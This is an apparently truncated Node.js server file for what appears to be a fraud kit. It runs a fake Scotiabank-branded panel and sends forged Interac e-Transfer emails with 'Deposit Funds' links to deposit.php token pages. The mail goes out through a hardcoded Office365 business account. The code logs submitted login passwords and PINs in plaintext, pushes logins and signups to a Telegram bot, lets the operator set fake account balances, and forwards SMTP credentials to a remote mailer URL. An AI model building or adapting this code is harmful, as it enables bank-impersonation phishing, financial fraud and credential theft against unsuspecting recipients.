import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import fs from 'fs';
import http from 'http';
import { Server as SocketServer } from 'socket.io';
import nodemailer from 'nodemailer';
import { GlobalSettings } from './src/types/settings';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DB_DIR = path.join(__dirname, 'db');

// Ensure DB directories exist
if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR, { recursive: true });
if (!fs.existsSync(path.join(DB_DIR, 'chats'))) fs.mkdirSync(path.join(DB_DIR, 'chats'), { recursive: true });
if (!fs.existsSync(path.join(DB_DIR, 'users'))) fs.mkdirSync(path.join(DB_DIR, 'users'), { recursive: true });
if (!fs.existsSync(path.join(DB_DIR, 'settings'))) fs.mkdirSync(path.join(DB_DIR, 'settings'), { recursive: true });
if (!fs.existsSync(path.join(DB_DIR, 'logs'))) fs.mkdirSync(path.join(DB_DIR, 'logs'), { recursive: true });

import crypto from 'crypto';

const CRYPTO_KEY = "ShadowCoreEncryptionKey123456789"; // 32 bytes
const CRYPTO_IV_LEN = 16;

function encryptField(text?: string): string {
    if (!text) return "";
    if (text.startsWith('ENC:')) return text;
    try {
        const iv = crypto.randomBytes(CRYPTO_IV_LEN);
        const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(CRYPTO_KEY), iv);
        let encrypted = cipher.update(text);
        encrypted = Buffer.concat([encrypted, cipher.final()]);
        return 'ENC:' + iv.toString('hex') + ':' + encrypted.toString('hex');
    } catch(e) {
        return text;
    }
}

function decryptField(text?: string): string {
    if (!text) return "";
    if (!text.startsWith('ENC:')) return text;
    try {
        const parts = text.substring(4).split(':');
        const iv = Buffer.from(parts[0], 'hex');
        const encryptedText = Buffer.from(parts[1], 'hex');
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(CRYPTO_KEY), iv);
        let decrypted = decipher.update(encryptedText);
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        return decrypted.toString();
    } catch (e) {
        return text;
    }
}

const defaultSettings: GlobalSettings = {
    general: { 
        app_url: "https://your-app.trycloudflare.com", 
        webroot_url: "https://sim.trycloudflare.com",
        sender_name: "SHΔDØW CORE", 
        encryption_key: "a3f91b6cd024e8c29b76a149efcc5d42",
        maintenanceMode: false,
        bank_name: "Scotiabank",
        bank_logo: "",
        overdraftLimit: 5000,
        transferLimit: 3000,
        dailyLimit: 10000,
        forceSupportChat: false,
        globalEnable: true,
        admin_username: "PROJECTSARAH",
        admin_password: "ENC:00000000000000000000000000000000:ca84533f1680bb60514956d4c37c9b81",
        adminPin: "1234",
        baseActionUrl: ""
    },
    smtp: { host: "smtp.office365.com", port: 587, secure: false, user: "accounting@abfarms.ca", pass: "ENC:00000000000000000000000000000000:b23a659b0dab58376385fcd34840185a", senderName: "Shadow Mailer" },
    telegram: { token: "", chat_id: "", enabled: false }
};

const getChats = async () => {
    try {
        const chatsDir = path.join(DB_DIR, 'chats');
        const files = fs.readdirSync(chatsDir);
        const chatData: Record<string, any> = {};
        for (const file of files) {
            if (file.endsWith('.json')) {
                const username = file.replace('.json', '');
                const content = fs.readFileSync(path.join(chatsDir, file), 'utf-8');
                chatData[username] = JSON.parse(content);
            }
        }
        return chatData;
    } catch (e) {
        console.warn("⚠️ [Matrix] Warning: Chat database unreachable.", e);
    }
    return {};
};

const saveChat = async (userId: string, messages: any[]) => {
    try {
        const chatPath = path.join(DB_DIR, 'chats', `${userId}.json`);
        fs.writeFileSync(chatPath, JSON.stringify(messages, null, 2));
    } catch (e) {
        console.error("❌ Failed to save chats:", e);
    }
};

const getSettings = async (): Promise<GlobalSettings> => {
    const settingsPath = path.join(DB_DIR, 'settings', 'global.json');
    let settings = defaultSettings;
    try {
        if (fs.existsSync(settingsPath)) {
            const data = JSON.parse(fs.readFileSync(settingsPath, 'utf-8'));
            settings = { ...defaultSettings, ...data };
        } else {
            // Wait, we shouldn't save decrypted passwords to disk, we should save the ENCRYPTED defaultSettings.
            fs.writeFileSync(settingsPath, JSON.stringify(defaultSettings, null, 2));
        }
    } catch (e) {
        console.warn("⚠️ [Matrix] Warning: Simulation settings unreachable. Using defaults.");
    }
    
    // Decrypt sensitive fields for in-memory use
    return {
        ...settings,
        general: {
            ...settings.general,
            admin_password: decryptField(settings.general.admin_password)
        },
        smtp: {
            ...settings.smtp,
            pass: decryptField(settings.smtp.pass)
        },
        telegram: {
            ...settings.telegram,
            token: decryptField(settings.telegram?.token)
        }
    };
};

const getUsers = async (): Promise<any[]> => {
    try {
        const usersDir = path.join(DB_DIR, 'users');
        const files = fs.readdirSync(usersDir);
        const users: any[] = [];
        for (const file of files) {
            if (file.endsWith('.json')) {
                const content = fs.readFileSync(path.join(usersDir, file), 'utf-8');
                const user = JSON.parse(content);
                console.log(`[Auth] Loaded user from ${file}: ${user.username}`);
                users.push(user);
            }
        }
        return users;
    } catch (e) {
        console.warn("⚠️ [Matrix] Warning: Users database unreachable.");
    }
    return [];
};

const saveUsers = async (users: any[]) => {
    try {
        for (const user of users) {
            if (user.username) {
                const userPath = path.join(DB_DIR, 'users', `${user.username}.json`);
                fs.writeFileSync(userPath, JSON.stringify(user, null, 2));
            }
        }
    } catch (e) {
        console.error("❌ Failed to save users:", e);
    }
};

const getUser = async (username: string) => {
    const userPath = path.join(DB_DIR, 'users', `${username}.json`);
    if (fs.existsSync(userPath)) {
        return JSON.parse(fs.readFileSync(userPath, 'utf-8'));
    }
    return null;
};

const saveUser = async (user: any) => {
    const userPath = path.join(DB_DIR, 'users', `${user.username}.json`);
    fs.writeFileSync(userPath, JSON.stringify(user, null, 2));
};

const deleteUser = async (username: string) => {
    const userPath = path.join(DB_DIR, 'users', `${username}.json`);
    if (fs.existsSync(userPath)) {
        fs.unlinkSync(userPath);
    }
};

const updateGlobalSettings = async (settings: GlobalSettings) => {
    const settingsPath = path.join(DB_DIR, 'settings', 'global.json');
    const encryptedSettings = {
        ...settings,
        general: {
            ...settings.general,
            admin_password: encryptField(settings.general?.admin_password)
        },
        smtp: {
            ...settings.smtp,
            pass: encryptField(settings.smtp?.pass)
        },
        telegram: {
            ...settings.telegram,
            token: encryptField(settings.telegram?.token)
        }
    };
    fs.writeFileSync(settingsPath, JSON.stringify(encryptedSettings, null, 2));
};

const systemLogs: any[] = [];
const logEvent = (message: string) => {
    const timestamp = new Date().toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
    systemLogs.unshift({ timestamp, message });
    if (systemLogs.length > 50) systemLogs.pop();
};

const sendTelegramNotification = async (message: string) => {
    logEvent(`[Telegram] ${message.replace(/<[^>]*>?/gm, '')}`);
    const settings = await getSettings();
    if (!settings.telegram || !settings.telegram.enabled || !settings.telegram.token || !settings.telegram.chat_id) {
        return;
    }

    try {
        const url = `https://api.telegram.org/bot${settings.telegram.token}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: settings.telegram.chat_id,
                text: `🚀 [SARAH-OS] ${message}`,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.error("❌ Telegram Notify Error:", e);
    }
};

async function startServer() {
  const app = express();
  const server = http.createServer(app);
  const io = new SocketServer(server, {
    cors: { origin: "*" }
  });
  
  const activeUsers: Record<string, any> = {};

  io.on('connection', (socket) => {
    console.log(`🔌 New connection: ${socket.id}`);

    socket.on('register', async (data) => {
      activeUsers[socket.id] = {
        id: socket.id,
        username: data.username,
        currentPath: data.currentPath,
        lastSeen: new Date().toISOString()
      };
      io.emit('admin_update', { 
        activeUsers, 
        logs: systemLogs,
        sessions: Object.values(activeUsers).map(u => ({ id: u.id, username: u.username, lastSeen: u.lastSeen, currentPath: u.currentPath }))
      });

      // Send chat history if it's a known user
      if (data.username && data.username !== 'Guest') {
        const chats = await getChats();
        if (chats[data.username]) {
          socket.emit('chat_history', chats[data.username]);
        }
      }
    });

    socket.on('chat_message', async (data) => {
      const { from, message } = data;
      const username = from || 'Guest';
      
      const chats = await getChats();
      const messages = chats[username] || [];
      const newMsg = { from: username, message, timestamp: Date.now() };
      messages.push(newMsg);
      await saveChat(username, messages);

      logEvent(`[Chat] ${username}: ${message}`);
      io.emit('admin_message', { from: username, message, socketId: socket.id });
      
      // Notify Telegram for new support messages
      if (!username.includes('PROJECTSARAH')) {
          await sendTelegramNotification(`<b>Support Message</b>\nFrom: ${username}\nMessage: ${message}`);
      }
    });

    socket.on('admin_command', async (data) => {
      const { targetSocketId, targetUsername, command, payload } = data;
      
      if (command === 'chat_message') {
        // Use provided targetUsername or fallback to looking up the targetSocket's username
        let username = targetUsername;
        if (!username && targetSocketId) {
          const targetUser = activeUsers[targetSocketId];
          username = targetUser?.username || targetSocketId;
        }

        if (username) {
          const chats = await getChats();
          const messages = chats[username] || [];
          const newMsg = { from: 'admin', message: payload.message, timestamp: Date.now() };
          messages.push(newMsg);
          await saveChat(username, messages);
          
          // If online, emit directly
          if (targetSocketId) {
            const targetSocket = io.sockets.sockets.get(targetSocketId);
            if (targetSocket) {
              targetSocket.emit('client_command', { command: 'chat_message', from: 'admin', message: payload.message });
            }
          }
          
          // Always broadcast to all admin sockets to keep their views in sync
          io.emit('admin_message', { from: 'admin', to: username, message: payload.message });
          logEvent(`[Admin Chat] Sent to ${username}: ${payload.message}`);
        }
      } else if (targetSocketId) {
        io.to(targetSocketId).emit('client_command', { command, payload });
      }
    });

    socket.on('admin_request_history', async (data) => {
      const { username } = data;
      const chats = await getChats();
      if (chats[username]) {
        socket.emit('admin_chat_history', { username, history: chats[username] });
      } else {
        socket.emit('admin_chat_history', { username, history: [] });
      }
    });

    socket.on('disconnect', () => {
      delete activeUsers[socket.id];
      io.emit('admin_update', { 
        activeUsers, 
        logs: systemLogs,
        sessions: Object.values(activeUsers).map(u => ({ id: u.id, username: u.username, lastSeen: u.lastSeen, currentPath: u.currentPath }))
      });
      console.log(`🔌 Disconnected: ${socket.id}`);
    });
  });

  app.use(express.json());

  // AUTH API
  app.post("/api/auth/login", async (req, res) => {
      const { username: rawUsername, password: rawPassword, pin } = req.body;
      const username = rawUsername?.trim();
      const password = rawPassword?.trim();
      
      const settings = await getSettings();
      console.log(`[Auth] Login attempt: user="${username}", pass="${password}", pin="${pin}"`);
      
      const adminUser = settings.general.admin_username || "PROJECTSARAH";
      const adminPass = settings.general.admin_password || "PROJECTSARAH";
      const adminPin = settings.general.adminPin || "";
      
      const isPinMatch = !adminPin || adminPin === "" || pin === adminPin;
      
      // Check Admin Credentials
      if (username?.toUpperCase() === adminUser.toUpperCase() && password === adminPass && (isPinMatch || !pin)) {
          logEvent(`[Auth] Admin user ${username} logged in successfully.`);
          await sendTelegramNotification(`<b>Admin Login Detected</b>\nUser: ${username}\nIP: ${req.ip}`);
          const generateHistory = (count: number) => {
              const history = [];
              const now = new Date();
              for (let i = 0; i < count; i++) {
                  const date = new Date(now);
                  date.setDate(now.getDate() - i);
                  history.push({
                      id: `tx-${i}-${Math.random().toString(36).substr(2, 9)}`,
                      date: date.toISOString().split('T')[0],
                      description: i % 2 === 0 ? "Walmart Supercenter" : "Starbucks Coffee",
                      amount: -parseFloat((Math.random() * 50 + 10).toFixed(2)),
                      status: 'Completed',
                      category: 'Shopping'
                  });
              }
              return history;
          };

          const adminResponse = {
              id: 'admin',
              username: adminUser,
              adminPin: adminPin || "1234",
              securityWord: 'SARAH',
              scenePoints: 15420,
              settings: {
                  displayName: "AB FARMS LTS",
                  memberSince: "2018",
                  adminPin: adminPin || "1234",
                  accountHolderName: "AB FARMS LTD",
                  phpmailerSenderName: "AB FARMS LTD"
              },
              accounts: {
                  "Ultimate Package": {
                      type: "banking",
                      balance: 4.82,
                      available: 4.82,
                      points: 0,
                      accountNumber: "8821",
                      history: generateHistory(10)
                  },
                  "Savings Plus": {
                      type: "banking",
                      balance: 1.25,
                      available: 1.25,
                      points: 0,
                      accountNumber: "3341",
                      history: generateHistory(5)
                  },
                  "Momentum Visa Infinite": {
                      type: "credit",
                      balance: 4950.00,
                      available: 50.00,
                      points: 850,
                      accountNumber: "1102",
                      history: generateHistory(15)
                  },
                  "SCENE+ Visa": {
                      type: "credit",
                      balance: 1200.00,
                      available: 800.00,
                      points: 1240,
                      accountNumber: "8841",
                      history: generateHistory(8)
                  }
              },
              contacts: [],
              purchasedCards: []
          };

          return res.json({ success: true, user: adminResponse });
      }

      // Check Regular Users
      const users = await getUsers();
      console.log(`[Auth] Checking against ${users.length} registered users.`);
      
      const dbUser = users.find(u => {
          const match = u.username?.toLowerCase() === username?.toLowerCase();
          if (match) {
              console.log(`[Auth] Found user entry for ${username}. Comparing passwords: "${u.password}" === "${password}"`);
          }
          return match && u.password === password;
      });

      if (dbUser) {
          if (dbUser.enabled === false) {
              console.log(`[Auth] Denied: ${username} is disabled`);
              return res.json({ success: false, message: 'Account disabled' });
          }
          logEvent(`[Auth] User ${username} logged in successfully.`);
          return res.json({ success: true, user: dbUser });
      }

      console.log(`[Auth] Failed: Invalid credentials for ${username}. Found users matching username: ${users.filter(u => u.username?.toLowerCase() === username?.toLowerCase()).length}`);
      if (users.filter(u => u.username?.toLowerCase() === username?.toLowerCase()).length > 0) {
          console.log(`[Auth] Found user entry, but password might not match.`);
      }
      return res.json({ success: false, message: 'Invalid credentials' });
  });

  // ADMIN API
  app.get("/api/admin/global-settings", async (req, res) => {
    res.json(await getSettings());
  });

  app.post("/api/admin/global-settings", async (req, res) => {
    try {
      const settings = await getSettings();
      const updated = { 
        ...settings, 
        ...req.body,
        general: { ...settings.general, ...req.body.general },
        smtp: { ...settings.smtp, ...req.body.smtp },
        telegram: { ...settings.telegram, ...req.body.telegram }
      };
      
      const changes: string[] = [];
      const compareObjs = (oldObj: any, newObj: any, prefix = "") => {
          for (const key in newObj) {
              if (typeof newObj[key] === 'object' && newObj[key] !== null) {
                  compareObjs(oldObj[key] || {}, newObj[key], `${prefix}${key}.`);
              } else if (oldObj[key] !== newObj[key] && newObj[key] !== undefined) {
                  const oldVal = (key === 'pass' || key === 'botToken') ? "***" : oldObj[key];
                  const newVal = (key === 'pass' || key === 'botToken') ? "***" : newObj[key];
                  changes.push(`${prefix}${key}: '${oldVal}' -> '${newVal}'`);
              }
          }
      };
      compareObjs(settings, updated);

      await updateGlobalSettings(updated);
      
      if (changes.length > 0) {
          logEvent(`[System] Admin updated settings: ${changes.join(", ")}`);
      } else {
          logEvent(`[System] Admin saved settings (no changes).`);
      }
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ success: false, error: e.message });
    }
  });

  app.get("/api/admin/users", async (req, res) => {
    try {
      res.json({ users: await getUsers() });
    } catch (e) {
      res.status(500).json({ success: false, error: "Database error" });
    }
  });

  app.post("/api/admin/users/create", async (req, res) => {
    try {
      const newUser = { 
          ...req.body, 
          id: Date.now().toString(),
          enabled: true,
          created_at: new Date().toISOString()
      };
      await saveUser(newUser);
      res.json({ success: true });
    } catch (e) {
      res.status(500).json({ success: false, error: "Creation failed" });
    }
  });

  app.post("/api/admin/users/approve", async (req, res) => {
    try {
      const { username } = req.body;
      const user = await getUser(username);
      if (user) {
          const updatedUser = {
              ...user,
              isApproved: true,
              enabled: true,
              isLocked: false
          };
          await saveUser(updatedUser);
          logEvent(`[Admin] Approved user ${username}`);
          await sendTelegramNotification(`<b>User Approved</b>\nUser: ${username}`);
          res.json({ success: true });
      } else {
          res.status(404).json({ success: false, message: "User not found" });
      }
    } catch (e) {
      res.status(500).json({ success: false, error: "Approval failed" });
    }
  });

  app.post("/api/admin/users/lock", async (req, res) => {
    try {
      const { username, locked } = req.body;
      const user = await getUser(username);
      if (user) {
          user.isLocked = locked;
          await saveUser(user);
          logEvent(`[Admin] Account ${locked ? 'LOCKED' : 'UNLOCKED'} for ${username}`);
          res.json({ success: true });
      } else {
          res.status(404).json({ success: false, message: "User not found" });
      }
    } catch (e) {
      res.status(500).json({ success: false, error: "Locking failed" });
    }
  });

  app.post("/api/admin/users/toggle-enabled", async (req, res) => {
    try {
      const { username } = req.body;
      const user = await getUser(username);
      if (user) {
          user.enabled = !user.enabled;
          await saveUser(user);
          res.json({ success: true });
      } else {
          res.status(404).json({ success: false, message: "User not found" });
      }
    } catch (e) {
      res.status(500).json({ success: false, error: "Toggle failed" });
    }
  });

  app.post("/api/admin/users/update-balance", async (req, res) => {
    try {
      const { username, account, balance } = req.body;
      const user = await getUser(username);
      if (user) {
          if (user.accounts && user.accounts[account]) {
              const oldBalance = user.accounts[account].balance;
              user.accounts[account].balance = balance;
              user.accounts[account].available = balance;
              await saveUser(user);
              logEvent(`[DB] Updated ${username}'s ${account} balance: $${oldBalance} -> $${balance}`);
              res.json({ success: true });
          } else {
              res.status(404).json({ success: false, message: "Account not found" });
          }
      } else {
          res.status(404).json({ success: false, message: "User not found" });
      }
    } catch (e) {
      res.status(500).json({ success: false, error: "Balance update failed" });
    }
  });

  app.post("/api/admin/users/update-settings", async (req, res) => {
      const { username, updates, data } = req.body;
      const finalUpdates = updates || data;
      try {
        const user = await getUser(username);
        if (user) {
            user.settings = { ...user.settings, ...finalUpdates };
            await saveUser(user);
            res.json({ success: true });
        } else {
            res.status(404).json({ success: false, message: "User not found" });
        }
      } catch (e) {
        res.status(500).json({ success: false, error: "Internal error" });
      }
  });

  app.post("/api/etransfer/check-recipient", async (req, res) => {
      const { email } = req.body;
      const users = await getUsers();
      // Check if any user has this email in their settings or username
      const recipient = users.find(u => u.username === email || u.settings?.email === email);
      if (recipient && recipient.isApproved !== false) {
          res.json({ 
            registered: true, 
            username: recipient.username,
            name: recipient.settings?.accountHolderName || recipient.settings?.phpmailerSenderName || recipient.username 
          });
      } else {
          res.json({ registered: false });
      }
  });

  app.post("/api/etransfer/internal-deposit", async (req, res) => {
    try {
        const { senderUsername, recipientUsername, amount, description, fromAccountName } = req.body;
        const sender = await getUser(senderUsername);
        const recipient = await getUser(recipientUsername);

        if (!sender || !recipient) {
            return res.status(404).json({ success: false, message: "User not found" });
        }

        const recipientAccounts = { ...recipient.accounts };
        const recipientMainAccount = recipientAccounts['Ultimate Package'] || Object.values(recipientAccounts)[0];
        const recipientAccountName = recipientAccounts['Ultimate Package'] ? 'Ultimate Package' : Object.keys(recipientAccounts)[0];

        if (recipientMainAccount) {
            const depositTx = {
                id: `et-${Date.now()}`,
                date: new Date().toISOString(),
                description: `Interac e-Transfer from ${sender.settings?.accountHolderName || sender.username}`,
                amount: amount,
                status: 'Completed',
                category: 'Deposit'
            };

            recipientMainAccount.history = [depositTx, ...(recipientMainAccount.history || [])];
            recipientMainAccount.balance = (recipientMainAccount.balance || 0) + amount;
            recipientMainAccount.available = (recipientMainAccount.available || 0) + amount;

            recipientAccounts[recipientAccountName] = recipientMainAccount;

            recipient.accounts = recipientAccounts;
            await saveUser(recipient);
            logEvent(`[E-Transfer] Auto-deposit: ${amount} from ${senderUsername} to ${recipientUsername}`);
            res.json({ success: true });
        } else {
            res.status(400).json({ success: false, message: "Recipient has no accounts" });
        }
    } catch (e) {
        console.error(e);
        res.status(500).json({ success: false });
    }
  });

  app.post("/api/user/delete", async (req, res) => {
    try {
      const { username } = req.body;
      await deleteUser(username);
      res.json({ success: true });
    } catch (e) {
      res.status(500).json({ success: false, error: "Deletion failed" });
    }
  });

  app.post("/api/user/update", async (req, res) => {
      const { username, password, data, isNew } = req.body;
      try {
        const user = await getUser(username);
        
        if (user) {
            const updatedUser = { ...user, ...data };
            await saveUser(updatedUser);
            res.json({ success: true });
        } else if (isNew) {
            const newUser = { 
              id: Date.now().toString(),
              username,
              password,
              ...data,
              enabled: true,
              created_at: new Date().toISOString()
            };
            await saveUser(newUser);
            logEvent(`[Auth] New signup request: ${username}`);
            await sendTelegramNotification(`<b>New Signup Request</b>\nUser: ${username}`);
            res.json({ success: true });
        } else {
            console.log("User update for transient user:", username);
            res.json({ success: true });
        }
      } catch (e) {
        res.status(500).json({ success: false, error: "Internal error" });
      }
  });
  app.get("/api/admin/backup/export", async (req, res) => {
    try {
        const exportData: Record<string, any> = {};
        const collections = ['users', 'chats', 'settings', 'logs'];
        
        for (const col of collections) {
            exportData[col] = {};
            const colPath = path.join(DB_DIR, col);
            if (fs.existsSync(colPath)) {
                const files = fs.readdirSync(colPath);
                for (const file of files) {
                    if (file.endsWith('.json')) {
                        const content = fs.readFileSync(path.join(colPath, file), 'utf-8');
                        exportData[col][file] = JSON.parse(content);
                    }
                }
            }
        }
        
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', `attachment; filename=backup-${new Date().toISOString().split('T')[0]}.json`);
        res.json(exportData);
    } catch (e: any) {
        res.status(500).json({ success: false, error: e.message });
    }
  });

  app.post("/api/admin/backup/import", async (req, res) => {
    try {
        const importData = req.body;
        if (!importData || typeof importData !== 'object') {
            return res.status(400).json({ success: false, error: "Invalid backup data" });
        }

        const collections = ['users', 'chats', 'settings', 'logs'];
        for (const col of collections) {
            if (importData[col]) {
                const colPath = path.join(DB_DIR, col);
                if (!fs.existsSync(colPath)) fs.mkdirSync(colPath, { recursive: true });
                
                for (const [filename, content] of Object.entries(importData[col])) {
                    if (filename.endsWith('.json')) {
                        fs.writeFileSync(path.join(colPath, filename), JSON.stringify(content, null, 2));
                    }
                }
            }
        }
        
        logEvent(`[System] Data restoration completed from backup.`);
        res.json({ success: true });
    } catch (e: any) {
        res.status(500).json({ success: false, error: e.message });
    }
  });

  app.get("/api/admin/sessions", (req, res) => res.json({ sessions: [] }));
  app.get("/api/logs", (req, res) => {
      res.json(systemLogs);
  });

  app.get("/api/admin/debug-logs", async (req, res) => {
    try {
        const logsPath = path.join(DB_DIR, 'logs', 'debug.json');
        if (fs.existsSync(logsPath)) {
            const logs = JSON.parse(fs.readFileSync(logsPath, 'utf-8'));
            res.json(logs.slice(0, 100));
        } else {
            res.json([]);
        }
    } catch (e) {
        res.status(500).json({ error: "Failed to fetch debug logs" });
    }
  });

  app.post("/api/admin/debug-logs", async (req, res) => {
    try {
        const { message, type, context } = req.body;
        const logsPath = path.join(DB_DIR, 'logs', 'debug.json');
        const logs = fs.existsSync(logsPath) ? JSON.parse(fs.readFileSync(logsPath, 'utf-8')) : [];
        
        logs.unshift({
            message,
            type: type || 'info',
            context: context || {},
            timestamp: Date.now(),
            dateString: new Date().toISOString()
        });

        if (logs.length > 500) logs.pop();
        fs.writeFileSync(logsPath, JSON.stringify(logs, null, 2));
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false });
    }
  });

  app.get("/api/etransfer/status", async (req, res) => {
      const txId = req.query.tx as string;
      if (!txId) return res.status(400).json({ error: "Missing tx parameter" });
      
      try {
          const users = await getUsers();
          for (const user of users) {
              const accs = user.accounts || {};
              for (const accName in accs) {
                  const acc = accs[accName];
                  if (acc.pendingTransfers) {
                      for (const pt of acc.pendingTransfers) {
                          if (pt.id === txId || pt.referenceNumber === txId) {
                              return res.json({ status: 'pending' });
                          }
                      }
                  }
                  if (acc.history) {
                     for (const hist of acc.history) {
                          if (hist.id === txId || hist.referenceNumber === txId) {
                              return res.json({ status: 'deposited' }); // Found in history -> processed
                          }
                     }
                  }
              }
          }
          return res.status(404).json({ error: "Transaction not found" });
      } catch (e: any) {
          return res.status(500).json({ error: "Internal server error" });
      }
  });

  app.get("/api/config", async (req, res) => {
      res.json(await getSettings());
  });
  app.post("/api/config", async (req, res) => {
      try {
          const settings = await getSettings();
          const updated = { ...settings, ...req.body };
          
          const changes: string[] = [];
          const compareObjs = (oldObj: any, newObj: any, prefix = "") => {
              for (const key in newObj) {
                  if (typeof newObj[key] === 'object' && newObj[key] !== null) {
                      compareObjs(oldObj[key] || {}, newObj[key], `${prefix}${key}.`);
                  } else if (oldObj[key] !== newObj[key] && newObj[key] !== undefined) {
                      const oldVal = (key === 'pass' || key === 'botToken') ? "***" : oldObj[key];
                      const newVal = (key === 'pass' || key === 'botToken') ? "***" : newObj[key];
                      changes.push(`${prefix}${key}: '${oldVal}' -> '${newVal}'`);
                  }
              }
          };
          compareObjs(settings, updated);

          await updateGlobalSettings(updated);
          if (changes.length > 0) {
              logEvent(`[System] Core config updated: ${changes.join(", ")}`);
          } else {
              logEvent(`[System] Core config saved (no changes).`);
          }
          res.json({ success: true });
      } catch (e: any) {
          res.status(500).json({ success: false, error: e.message });
      }
  });
  app.get("/api/debug/smtp", (req, res) => res.json({ success: true, message: "SMTP debug okay" }));

  app.post("/api/mailer", async (req, res) => {
    try {
        const payload = req.body;
        const { recipient_email, recipient_name, amount, purpose, template, sender_name, reference_number, date } = req.body;
        console.log(`Sending email to ${recipient_email} (${recipient_name}) for ${amount}`);
        
        const settings = await getSettings();
        
        let actionUrl = settings.general.baseActionUrl || "";
        if (actionUrl && actionUrl.endsWith('/')) {
            actionUrl = actionUrl.slice(0, -1);
        }

        const isAIStudio = !!process.env.K_SERVICE;
        const isRender = process.env.RENDER === "true";

        let methodsToTry = [];
        if (isRender) {
            methodsToTry = ['remote', 'local'];
        } else if (isAIStudio) {
            methodsToTry = ['remote', 'local'];
        } else {
            methodsToTry = ['local', 'remote'];
        }

        let success = false;
        let lastErrorText = "";
        const txId = reference_number || 'CA' + Math.random().toString(36).substring(2, 12).toUpperCase();

        for (const method of methodsToTry) {
            if (success) break;

            if (method === 'remote') {
                if (!actionUrl) continue;
                try {
                    const fallbackBody = {
                        ...payload,
                        renderedTemplate: template,
                        action_url: actionUrl,
                        app_url: payload.app_url || req.headers.origin || settings.general.app_url,
                        smtp: settings.smtp
                    };

                    const response = await fetch(`${actionUrl}/api/mailer.php`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(fallbackBody)
                    });
                    
                    if (!response.ok) {
                        throw new Error(`Remote PHP mailer returned status ${response.status}`);
                    }
                    
                    logEvent(`[Mailer] Successfully sent to ${recipient_email} via remote mailer at ${actionUrl}`);
                    success = true;
                } catch (e: any) {
                    console.error("❌ Remote Mailer Error:", e);
                    lastErrorText = lastErrorText ? lastErrorText + " | Remote: " + e.message : "Remote: " + e.message;
                    logEvent(`⚠️ [Mailer Warning] Remote attempted but failed: ${e.message}`);
                    await sendTelegramNotification(`⚠️ <b>MAILER WARNING</b>\nRemote PHP Mailer failed.\nError: ${e.message}\nAction URL: ${actionUrl}`);
                }
            } else if (method === 'local') {
                try {
                    const templateNameStr = template ? template.replace('.html', '') : 'Transfer';
                    let templateHtml = await fetchTemplate(templateNameStr);
                    
                    if (!templateHtml) {
                        try {
                            const p1 = path.join(process.cwd(), 'server', 'templates', `${templateNameStr}.html`);
                            const p2 = path.join(process.cwd(), 'remote_server', 'templates', `${templateNameStr}.html`);
                            let foundPath = fs.existsSync(p1) ? p1 : (fs.existsSync(p2) ? p2 : null);

                            if (!foundPath && process.argv[1]) {
                                const p3 = path.join(path.dirname(process.argv[1]), 'server', 'templates', `${templateNameStr}.html`);
                                if (fs.existsSync(p3)) foundPath = p3;
                            }

                            if (foundPath) {
                                templateHtml = fs.readFileSync(foundPath, 'utf8');
                            }
                        } catch (err) {}
                    }
                    
                    if (!templateHtml) {
                        console.warn("⚠️ No HTML template found for local rendering. Using fallback default template.");
                        const defaultTemplatePath = path.join(process.cwd(), 'server', 'templates', 'Transfer.html');
                        if (fs.existsSync(defaultTemplatePath)) {
                            templateHtml = fs.readFileSync(defaultTemplatePath, 'utf8');
                        } else {
                            templateHtml = `
                            <div style="font-family: Arial, sans-serif; background: #eaeced; padding: 20px;">
                                <div style="max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px;">
                                    <h1 style="color: #333;">Interac e-Transfer</h1>
                                    <p style="font-size: 16px;"><strong>{{sender_name}}</strong> has sent you <strong>\${{amount}}</strong> (CAD).</p>
                                    <p>Message: {{memo}}</p>
                                    <a href="{{action_url}}" style="display: inline-block; padding: 12px 24px; background: #E31837; color: #fff; text-decoration: none; font-weight: bold; border-radius: 4px; margin: 20px 0;">Deposit Funds</a>
                                    <p style="font-size: 12px; color: #666;">Reference: {{transaction_id}}<br>Expires: {{expiry_date}}</p>
                                </div>
                            </div>`;
                        }
                    }

                    const effectiveAppUrl = payload.app_url || req.headers.origin || settings.general.app_url;
                    const tokenObj = {
                        transaction_id: txId,
                        amount: amount,
                        recipientName: recipient_name,
                        senderName: sender_name,
                        senderEmail: payload.sender_email || (payload.deposit_payload && payload.deposit_payload.senderEmail) || "",
                        purpose: purpose,
                        app_url: effectiveAppUrl // Pass the react app domain to the gateway
                    };
                    const token = Buffer.from(JSON.stringify(tokenObj)).toString('base64');
                    const depositLink = actionUrl ? `${actionUrl}/deposit.php?token=${encodeURIComponent(token)}` : `${effectiveAppUrl}/deposit?token=${encodeURIComponent(token)}`;
                    const encryptedLink = actionUrl ? `${actionUrl}/deposit.php?token=${encodeURIComponent(token)}&e=1` : `${effectiveAppUrl}/deposit?token=${encodeURIComponent(token)}&type=encrypted`;
                    
                    let finalHtml = templateHtml;
                    const replacements: Record<string, string> = {
                        '{{sender_name}}': sender_name || '',
                        '{{receiver_name}}': recipient_name || '',
                        '{{amount}}': parseFloat(amount || '0').toFixed(2),
                        '{{transaction_id}}': txId,
                        '{{action_url}}': depositLink,
                        '{{ENCRYPTED_URL}}': encryptedLink,
                        '{{date}}': date || new Date().toLocaleDateString('en-US'),
                        '{{expiry_date}}': new Date(Date.now() + 30*24*60*60*1000).toLocaleDateString('en-US'),
                        '{{memo}}': purpose || '',
                        '{{bank_name}}': settings.general.bank_name || 'Global Bank',
                        '{{year}}': new Date().getFullYear().toString()
                    };

                    for (const [key, value] of Object.entries(replacements)) {
                        finalHtml = finalHtml.split(key).join(value);
                    }

                    await sendEmail(recipient_email, purpose || "Interac e-Transfer", `You received a transfer from ${sender_name}`, finalHtml, sender_name);
